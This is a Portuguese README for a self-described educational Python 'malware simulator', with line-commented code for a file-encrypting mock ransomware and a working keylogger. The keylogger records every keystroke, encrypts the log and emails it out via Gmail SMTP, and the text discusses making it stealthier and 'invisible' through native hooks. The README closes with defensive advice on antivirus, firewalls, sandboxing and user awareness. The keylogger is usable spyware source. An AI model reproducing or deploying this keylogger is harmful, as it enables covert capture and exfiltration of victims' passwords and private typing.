# 🛡️ Simulador Educativo de Malware com Python

## 🎯 Objetivo
Implementar, documentar e compartilhar um estudo prático utilizando Python para simular o comportamento de malwares em um ambiente seguro e controlado.
O foco é educativo, com o intuito de promover o entendimento sobre segurança da informação.
> ⚠️ **Aviso Legal**: Este projeto é estritamente educativo. Nenhuma funcionalidade deve ser utilizada para fins maliciosos ou fora de ambientes controlados.

### Componentes do Projeto

**🔐 Ransomware Simulado**  
  - Criação de arquivos de teste  
  - Script para criptografar e descriptografar arquivos  
  - Geração de mensagem de "resgate" educativa

**🎹 Keylogger Simulado**  
  - Captura de teclas em arquivo `.txt`  
  - Tornar o script mais furtivo  
  - Envio automático por e-mail

## 🖥️ Ambiente & Ferramentas Utilizadas

O projeto foi desenvolvido em um computador pessoal utilizando o Visual Studio Code (VSCode) com Python. Abaixo, o passo a passo para configurar o ambiente:

### 🐍 Instalar o Python

1. **Baixe o instalador**  
   - Acesse [python.org/downloads](https://www.python.org/downloads/) e baixe a versão mais recente.

2. **Instale o Python**  
   - Execute o instalador e marque a opção “Add Python to PATH” antes de clicar em “Install Now”.

3. **Verifique a instalação**  
   - No terminal, digite:
     ```bash
     python --version
     ```

### 💻 Configurar o Python no VSCode

1. **Instale o VSCode**  
   - Baixe em [code.visualstudio.com](https://code.visualstudio.com/)

2. **Instale a extensão Python**  
   - No VSCode, vá até a aba de extensões e instale a extensão oficial da Microsoft chamada “Python”.

3. **Configure o interpretador Python**  
   - Acesse `Arquivo > Preferências > Configurações`, pesquise por “Python: Caminho do Interpretador” e selecione o Python instalado.

## 📚 Ransomware Simulado

>Este módulo simula o comportamento de um ransomware de forma educativa. O código está comentado linha por linha no arquivo `simransomware.py`.

Funcionalidades:

- Geração de chave de criptografia
- Criptografia de arquivos `.txt`
- Descriptografia de arquivos `.cripto`
- Criação de mensagem educativa
- Menu interativo para execução das funções

Aqui está o código comentado linha por linha, explicando o que cada parte faz:

### 📦 Importações

```python
from cryptography.fernet import Fernet  # Importa a classe Fernet da biblioteca cryptography para realizar criptografia simétrica.
import os  # Importa o módulo os para manipulação de arquivos e diretórios.
```

---

### 🔑 Função para gerar e salvar uma chave de criptografia

```python
def gerar_chave():
    chave = Fernet.generate_key()  # Gera uma chave de criptografia segura.
    with open("chave.key", "wb") as chave_file:  # Abre (ou cria) o arquivo 'chave.key' em modo binário para escrita.
        chave_file.write(chave)  # Escreve a chave gerada no arquivo.
    print("✅ Chave gerada e salva como 'chave.key'.")  # Exibe mensagem de sucesso.
```

---

### 📥 Função para carregar a chave salva

```python
def carregar_chave():
    try:
        return open("chave.key", "rb").read()  # Tenta abrir e ler o conteúdo do arquivo 'chave.key' em modo binário.
    except FileNotFoundError:  # Caso o arquivo não exista...
        print("⚠️  Arquivo de chave não encontrado. Gere uma chave primeiro.")  # Exibe aviso.
        return None  # Retorna None para indicar falha.
```

---

### 🔐 Função para criptografar um arquivo

```python
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)  # Cria um objeto Fernet com a chave fornecida.
    with open(arquivo, "rb") as file:  # Abre o arquivo original em modo binário para leitura.
        dados = file.read()  # Lê os dados do arquivo.
    dados_encriptados = f.encrypt(dados)  # Criptografa os dados lidos.
    with open(arquivo + ".cripto", "wb") as file:  # Cria um novo arquivo com extensão '.cripto' para salvar os dados criptografados.
        file.write(dados_encriptados)  # Escreve os dados criptografados no novo arquivo.
    print(f"🔐 Arquivo '{arquivo}' criptografado como '{arquivo}.cripto'.")  # Mensagem de sucesso.
```

---

### 🔓 Função para descriptografar um arquivo

```python
def descriptografar_arquivo(arquivo_cripto, chave):
    f = Fernet(chave)  # Cria objeto Fernet com a chave fornecida.
    with open(arquivo_cripto, "rb") as file:  # Abre o arquivo criptografado.
        dados_encriptados = file.read()  # Lê os dados criptografados.
    try:
        dados_originais = f.decrypt(dados_encriptados)  # Tenta descriptografar os dados.
        nome_original = arquivo_cripto.replace(".cripto", ".restaurado.txt")  # Define nome do arquivo restaurado.
        with open(nome_original, "wb") as file:  # Cria o arquivo restaurado.
            file.write(dados_originais)  # Escreve os dados originais nele.
        print(f"✅ Arquivo restaurado como '{nome_original}'.")  # Mensagem de sucesso.
    except Exception as e:  # Se ocorrer erro na descriptografia...
        print(f"❌ Erro ao descriptografar '{arquivo_cripto}': {e}")  # Exibe mensagem de erro.
```

---

### 📂 Função para encontrar arquivos com determinada extensão

```python
def encontrar_arquivos(diretorio, extensao=".txt"):
    lista = []  # Inicializa lista para armazenar caminhos dos arquivos encontrados.
    for raiz, _, arquivos in os.walk(diretorio):  # Percorre diretório e subdiretórios.
        for nome in arquivos:  # Para cada arquivo...
            if nome.endswith(extensao):  # Verifica se termina com a extensão desejada.
                lista.append(os.path.join(raiz, nome))  # Adiciona caminho completo à lista.
    return lista  # Retorna lista de arquivos encontrados.
```

---

### 📄 Função para criar uma mensagem educativa

```python
def criar_mensagem_educativa():
    with open("LEIA ISSO.txt", "w") as f:  # Cria ou sobrescreve o arquivo 'LEIA ISSO.txt'.
        f.write("Este é um exemplo educativo de criptografia de arquivos.\n")  # Escreve linha 1.
        f.write("Nenhum dado real foi comprometido.\n")  # Escreve linha 2.
        f.write("Use criptografia para proteger suas informações pessoais e profissionais.")  # Escreve linha 3.
    print("📄 Mensagem educativa criada como 'LEIA ISSO.txt'.")  # Mensagem de sucesso.
```

---

### 🧭 Função que exibe o menu interativo

```python
def menu():
    while True:  # Loop infinito até o usuário escolher sair.
        print("\n🔧 Menu do Simulador de Criptografia")  # Título do menu.
        print("1. Gerar chave de criptografia")  # Opção 1.
        print("2. Criptografar arquivos .txt")  # Opção 2.
        print("3. Descriptografar arquivos .cripto")  # Opção 3.
        print("4. Ver arquivos criptografados")  # Opção 4.
        print("5. Criar mensagem educativa")  # Opção 5.
        print("6. Sair")  # Opção 6.

        escolha = input("Escolha uma opção (1-6): ")  # Solicita escolha do usuário.

        if escolha == "1":
            gerar_chave()  # Gera chave.
        elif escolha == "2":
            chave = carregar_chave()  # Carrega chave.
            if chave:
                arquivos = encontrar_arquivos("test_files")  # Busca arquivos .txt.
                if arquivos:
                    for arquivo in arquivos:
                        criptografar_arquivo(arquivo, chave)  # Criptografa cada arquivo.
                else:
                    print("📂 Nenhum arquivo .txt encontrado em 'test_files'.")
        elif escolha == "3":
            chave = carregar_chave()  # Carrega chave.
            if chave:
                criptos = encontrar_arquivos("test_files", ".cripto")  # Busca arquivos criptografados.
                if criptos:
                    for arquivo in criptos:
                        descriptografar_arquivo(arquivo, chave)  # Descriptografa cada um.
                else:
                    print("📭 Nenhum arquivo .cripto encontrado para restaurar.")
        elif escolha == "4":
            criptos = encontrar_arquivos("test_files", ".cripto")  # Busca arquivos criptografados.
            if criptos:
                print("📂 Arquivo criptografado encontrado em:")
                for f in criptos:
                    print(f" 📂 {f}")  # Exibe caminho de cada arquivo.
            else:
                print("📭 Nenhum arquivo criptografado encontrado.")
        elif escolha == "5":
            criar_mensagem_educativa()  # Cria mensagem educativa.
        elif escolha == "6":
            print("👋 Encerrando o simulador. Até a próxima!")  # Encerra o programa.
            break
        else:
            print("❌ Opção inválida. Tente novamente.")  # Trata entrada inválida.
```

---

### ▶️ Ponto de entrada do programa

```python
if __name__ == "__main__":
    menu()  # Executa o menu se o script for executado diretamente.
```

## 🎹 Keylogger Simulado
>Este módulo simula o comportamento de um keylogger de forma educativa. O código está comentado linha por linha no arquivo `keyloggerv2.py`.

### 🚀 Estratégias usadas para deixar a captura de teclas mais eficiente

**1. Trocar `pynput` por `keyboard` (mais leve e direto)**

Vantagens:
- Mais leve e com menos sobrecarga que pynput.
- Permite escutar teclas com menos latência.
- Suporte direto a hotkeys e gravação de sequências.

**2. Buffer de escrita com `queue` para evitar I/O constante**

Vantagens:
- Reduz uso de disco.
- Aumenta desempenho.
- Evita travamentos em sistemas com I/O lento.

**3. Captura por hook nativo (nível avançado)**

Para máxima eficiência e invisibilidade, é possível usar hooks nativos com `ctypes` ou `pywin32` no Windows. Isso exige conhecimento de APIs de sistema e é mais complexo.

Vantagens:
- Menor latência.
- Menor consumo de memória.
- Maior controle sobre eventos.

Para fins didáticos e eficiência real, minhas modificações foram:

- ✅ Usar keyboard para captura mais leve.
- ✅ Implementar buffer com queue para reduzir I/O.
- ✅ (Não implementado no exemplo abaixo) Explorar hooks nativos.


### 🧩 Parte 1: Importação de bibliotecas

```python
import keyboard              # Captura eventos de teclado em tempo real
import threading             # Permite executar funções em paralelo (multithreading)
import time                  # Usado para controlar intervalos de tempo
from queue import Queue      # Estrutura de dados para armazenar teclas antes de gravar
from cryptography.fernet import Fernet  # Criptografia simétrica segura
import smtplib               # Envio de e-mails via protocolo SMTP
import ssl                   # Criação de conexão segura (SSL/TLS)
from email.message import EmailMessage  # Composição de mensagens de e-mail
import os                    # Manipulação de arquivos e verificação de existência
```

---

### ⚙️ Parte 2: Configurações iniciais

```python
# Caminhos dos arquivos usados no projeto
CAMINHO_LOG = "log.txt"                  # Arquivo temporário onde as teclas são registradas
CAMINHO_LOG_CRIPTO = "log_encrypted.txt" # Arquivo criptografado
CAMINHO_CHAVE = "chave.key"              # Arquivo que armazena a chave de criptografia

# Credenciais de e-mail
EMAIL_REMETENTE = "seuemail@gmail.com"       # E-mail que envia o log
EMAIL_SENHA = "senha de app do seu email"    # Senha de aplicativo gerada pelo Gmail
EMAIL_DESTINATARIO = "seuemail@gmail.com"    # E-mail que recebe o log

INTERVALO_GRAVACAO = 5  # Intervalo (em segundos) entre gravações do buffer no arquivo
```

---

### ⌨️ Parte 3: Captura de teclas e buffer

```python
fila = Queue()  # Cria uma fila para armazenar teclas pressionadas antes de gravar

# Função chamada a cada tecla pressionada
def capturar_tecla(evento):
    nome = evento.name  # Obtém o nome da tecla

    # Identifica e formata teclas especiais
    if nome == "space":
        fila.put(" ")
    elif nome == "enter":
        fila.put("\n")
    elif nome == "tab":
        fila.put("\t")
    elif nome == "backspace":
        fila.put(" [BACKSPACE] ")
    elif len(nome) == 1:
        fila.put(nome)  # Tecla comum (letra, número ou símbolo)
    else:
        fila.put(f"[{nome}] ")  # Tecla especial (ex: shift, ctrl, etc.)
```

---

### 🗂️ Parte 4: Gravação do buffer em arquivo

```python
# Função que grava o conteúdo da fila no arquivo de log
def gravar_buffer():
    while True:  # Loop contínuo em segundo plano
        if not fila.empty():  # Se houver teclas na fila
            with open(CAMINHO_LOG, "a", encoding="utf-8") as f:
                while not fila.empty():
                    tecla = fila.get()  # Remove a próxima tecla da fila
                    f.write(tecla)      # Escreve no arquivo
        time.sleep(INTERVALO_GRAVACAO)  # Aguarda antes de verificar novamente
```

---

### 🔐 Parte 5: Criptografia do log

```python
# Gera uma nova chave de criptografia se não existir
def gerar_chave():
    if not os.path.exists(CAMINHO_CHAVE):
        chave = Fernet.generate_key()
        with open(CAMINHO_CHAVE, "wb") as f:
            f.write(chave)

# Carrega a chave de criptografia do arquivo
def carregar_chave():
    with open(CAMINHO_CHAVE, "rb") as f:
        return f.read()

# Criptografa o conteúdo do arquivo de log
def criptografar_log():
    chave = carregar_chave()
    fernet = Fernet(chave)

    with open(CAMINHO_LOG, "rb") as f:
        dados = f.read()

    dados_criptografados = fernet.encrypt(dados)

    with open(CAMINHO_LOG_CRIPTO, "wb") as f:
        f.write(dados_criptografados)
```

---

### 📧 Parte 6: Envio por e-mail

```python
# Envia o arquivo criptografado por e-mail
def enviar_email():
    msg = EmailMessage()
    msg["Subject"] = "Log criptografado"
    msg["From"] = EMAIL_REMETENTE
    msg["To"] = EMAIL_DESTINATARIO
    msg.set_content("Segue em anexo o log criptografado.")

    # Anexa o arquivo criptografado
    with open(CAMINHO_LOG_CRIPTO, "rb") as f:
        conteudo = f.read()
        msg.add_attachment(conteudo, maintype="application", subtype="octet-stream", filename="log_encrypted.txt")

    contexto = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto) as servidor:
        servidor.login(EMAIL_REMETENTE, EMAIL_SENHA)
        servidor.send_message(msg)
```

---

### 🚀 Parte 7: Execução principal do programa

```python
if __name__ == "__main__":
    gerar_chave()  # Garante que a chave de criptografia esteja disponível

    # Inicia uma thread em segundo plano para gravar o buffer periodicamente
    threading.Thread(target=gravar_buffer, daemon=True).start()

    # Inicia a escuta de teclas pressionadas
    keyboard.on_press(capturar_tecla)

    try:
        keyboard.wait()  # Mantém o programa rodando até ser interrompido manualmente
    except KeyboardInterrupt:
        pass  # Permite encerrar com Ctrl+C sem erro

    # Após encerramento, criptografa o log e envia por e-mail
    criptografar_log()
    enviar_email()
```

## 📚 Aprendizados | A Importância da Cibersegurança e da Educação Digital

A crescente digitalização da vida pessoal e profissional tornou a cibersegurança uma prioridade inegociável. A educação digital, por sua vez, capacita usuários a reconhecerem ameaças e adotarem comportamentos seguros. Ransomwares e keyloggers são dois exemplos de ameaças que exploram vulnerabilidades técnicas e humanas, combatê-los exige uma abordagem multifacetada.


### 🧪 Antivírus e Antimalware

**Função:**  
São ferramentas essenciais que detectam, bloqueiam e removem softwares maliciosos, incluindo ransomwares e keyloggers.

**Contra Ransomware:**  
- Identificam padrões de comportamento suspeitos, como criptografia em massa de arquivos.
- Impedem a execução de scripts maliciosos que tentam se espalhar pela rede.

**Contra Keyloggers:**  
- Detectam tentativas de captura de teclado ou injeção de código em processos legítimos.
- Muitos antivírus modernos utilizam heurísticas e inteligência artificial para identificar keyloggers mesmo que estejam disfarçados.

**Reflexão:**  
Ter um antivírus atualizado é como ter um guarda na porta digital do seu sistema. No entanto, ele não é infalível. Por isso, deve ser parte de uma estratégia maior.


### 🔥 Firewalls

**Função:**  
Controlam o tráfego de entrada e saída da rede, bloqueando conexões não autorizadas.

**Contra Ransomware:**  
- Impedem que o malware se comunique com servidores de comando e controle (C2), bloqueando o envio de chaves de criptografia ou instruções de ataque.

**Contra Keyloggers:**  
- Podem bloquear tentativas de envio de dados capturados (como senhas e informações bancárias) para servidores externos.

**Reflexão:**  
Firewalls funcionam como porteiros atentos, filtrando o que entra e sai. Quando bem configurados, são uma barreira poderosa contra vazamentos e invasões silenciosas.


### 🧪 Sandboxing

**Função:**  
Executa arquivos e programas em ambientes isolados, impedindo que afetem o sistema principal.

**Contra Ransomware:**  
- Permite testar anexos de e-mail ou arquivos suspeitos sem risco de criptografar dados reais.
- Ajuda analistas de segurança a estudar o comportamento do malware com segurança.

**Contra Keyloggers:**  
- Impede que o keylogger acesse o sistema real ou se instale permanentemente.
- Facilita a análise de como o keylogger tenta se esconder ou se comunicar.

**Reflexão:**  
Sandboxing é como colocar um possível invasor em uma sala de vidro: você pode observá-lo sem se colocar em risco. É uma ferramenta valiosa para ambientes corporativos e testes de segurança.


### 🧠 Conscientização do Usuário

**Função:**  
Educar usuários sobre boas práticas de segurança digital, como identificar e-mails de phishing, evitar downloads suspeitos e manter senhas seguras.

**Contra Ransomware:**  
- Reduz a chance de abrir anexos maliciosos ou clicar em links comprometidos.
- Incentiva o uso de backups regulares, minimizando os danos de um ataque.

**Contra Keyloggers:**  
- Ensina a desconfiar de softwares gratuitos desconhecidos ou sites falsos que podem instalar keyloggers.
- Promove o uso de autenticação em multiplo fatores (MFA), que mitiga o impacto de senhas capturadas.

**Reflexão:**  
A maior vulnerabilidade de qualquer sistema é o fator humano. Investir em educação digital é como vacinar a sociedade contra ameaças invisíveis. Quanto mais informados estivermos, mais seguros estaremos.

## 📎 Recursos

### Documentações Oficiais

- [Python](https://docs.python.org/3/)
- [Cryptography – Fernet](https://cryptography.io/en/latest/)
- [pynput – Captura de Teclado](https://pypi.org/project/pynput/)
- [smtplib – Envio de E-mails](https://docs.python.org/3/library/smtplib.html)

### Materiais sobre GitHub

- [GitHub Quick Start](https://docs.github.com/en/get-started)
- [GitBook: Formação GitHub Certification](https://gitbook.com/)
- [Documentação do GitHub](https://docs.github.com/)
- [Guia Markdown do GitHub](https://guides.github.com/features/mastering-markdown/)
